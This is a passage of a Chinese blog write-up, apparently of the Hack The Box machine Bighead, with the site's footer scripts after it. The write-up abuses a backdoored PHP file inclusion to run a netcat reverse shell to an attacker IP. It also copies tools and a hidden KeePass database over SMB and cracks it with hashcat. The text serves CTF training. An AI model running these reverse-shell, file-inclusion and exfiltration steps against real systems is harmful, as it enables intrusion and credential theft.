+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 5080 -p 5080 -r 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.55.45.png" alt="截屏2021-11-29 上午4.55.45"><br>访问后出现多个报错信息，在目录<code>apps/testlink/htdocs</code>下发现提示文件<code>note.txt</code>：Bighead 破坏了 code，而 Dinesh 回应他整晚都在测试代码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.58.33.png" alt="截屏2021-11-29 上午4.58.33"><br>查看文件最近修改时间可以注意到<code>linkto.php</code>是最近被修改的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l *.php</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.59.34.png" alt="截屏2021-11-29 上午4.59.34"><br>尝试访问<code>/testlink/linkto.php</code>文件，它在<code>require_once</code>打开空字符串调用中失败<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.01.06.png" alt="截屏2021-11-29 上午5.01.06"><br>打开<code>linkto.php</code>文件发现代码顶部存在一串注释，在注释后存在变量<code>$PiperCoinAuth</code>，如果存在另一个 post 参数，则该变量由 post 参数设置，再传递给<code>require_once</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.02.25.png" alt="截屏2021-11-29 上午5.02.25"><br>这也就意味着我可以在主机上任何位置提供路径，而它将被包含在内。于是开始部署 php 用于反弹shell<br><em><strong>参考地址：<a target="_blank" rel="noopener" href="https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php">https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php</a></strong></em></p>
+<p>准备 nc.exe 和用于执行反弹的 php 代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&#x27;C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.16.3 2222&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>开始上传木马 mac.php 以及 nc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.10.16.3\mac\nc.exe \users\nelson\appdata\<span class="built_in">local</span>\temp\nc.exe</span><br><span class="line">copy \\10.10.16.3\mac\mac.php \users\nelson\appdata\<span class="built_in">local</span>\temp\mac.php</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.19.17.png" alt="截屏2021-11-29 上午5.19.17"></p>
+<p>执行 post 请求并在本地监听2222端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://code.bighead.htb/testlink/linkto.php&quot;</span> -d <span class="string">&quot;PiperID=&amp;PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\mac.php&quot;</span></span><br></pre></td></tr></table></figure>
+<p>成功在本地获得系统权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.20.51.png" alt="截屏2021-11-29 上午5.20.51"></p>
+<h3 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h3><h4 id="KeePass识别"><a href="#KeePass识别" class="headerlink" title="KeePass识别"></a>KeePass识别</h4><p>在用户 nginx 桌面上寻找flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\nginx\Desktop</span><br><span class="line"><span class="built_in">type</span> C:\Users\nginx\Desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.22.28.png" alt="截屏2021-11-29 上午5.22.28"><br>成功找到第一个flag，在管理员桌面上继续寻找第二个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\administrator\Desktop</span><br><span class="line">dir C:\Users\administrator\Desktop /a</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.23.59.png" alt="截屏2021-11-29 上午5.23.59"><br>发现 root.txt 被隐藏，通过命令可以显示该flag文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.25.03.png" alt="截屏2021-11-29 上午5.25.03"><br>但是这并不是一个真正的root.txt，靶机中存在 Keepass 注册表项，需要检查是否有用户在使用它，最终在管理员用户目录下找到对应的配置 xml 文档</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\administrator\AppData\Roaming\KeePass\KeePass.config.xml</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.30.41.png" alt="截屏2021-11-29 上午5.30.41"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.31.07.png" alt="截屏2021-11-29 上午5.31.07"><br>由此可以发现 root.txt 是数据库，而 admin.png 为密钥，同时下载它们</p>
+<h4 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h4><p>进入 bash 命令行，在管理员桌面上将 root.txt 复制至<code>/appdata/local/temp</code>目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\progra~1\bash\bash.exe</span><br><span class="line"><span class="built_in">cd</span> C:/Users/Administrator/Desktop</span><br><span class="line">cat root.txt:Zone.Identifier &gt; ../appdata/<span class="built_in">local</span>/temp/a.txt</span><br></pre></td></tr></table></figure>
+<p>同时输出文件的 md5 值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5sum root.txt:Zone.Identifier ../appdata/<span class="built_in">local</span>/temp/a.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.39.32.png" alt="截屏2021-11-29 上午5.39.32"><br>退出 bash 后拷贝这两个文件至本地目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy ..\appdata\<span class="built_in">local</span>\temp\a.txt \\10.10.16.3\mac\db.kdbx</span><br><span class="line">copy ..\Pictures\admin.png \\10.10.16.3\mac\admin.png</span><br></pre></td></tr></table></figure>
+
+<p>校验文件 md5 值成功，说明文件在传输过程中未发生改变</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file db.kdbx admin.png</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.45.56.png" alt="截屏2021-11-29 上午5.45.56"><br>将 db.kdbx 重命名为 root.txt:Zone.Identifier，使用 keepass2john 将其转换为可破解的哈希值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keepass2john -k admin.png root.txt:Zone.Identifier | tee keepass.hash</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.52.49.png" alt="截屏2021-11-29 上午5.52.49"></p>
+<p>使用 hashcat 对该哈希值进行破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13400 -a 0 -o keepass.cracked keepass.hash /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%886.02.04.png" alt="截屏2021-11-29 上午6.02.04"></p>
+<p>成功拿到密码为<code>darkness</code>，使用 keepass2 进行打开</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keepass2 root.txt:Zone.Identifier</span><br></pre></td></tr></table></figure>
+<p>将 admin.png 作为密钥，同时输入以上密码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%886.03.47.png" alt="截屏2021-11-29 上午6.03.47"><br>在其中发现 Password 的值为星号<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%886.04.56.png" alt="截屏2021-11-29 上午6.04.56"><br>复制该密码并粘贴到本地即可成功获取第二个flag<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%886.06.17.png" alt="截屏2021-11-29 上午6.06.17"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/df640eb9/">HTB: Ethereal<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
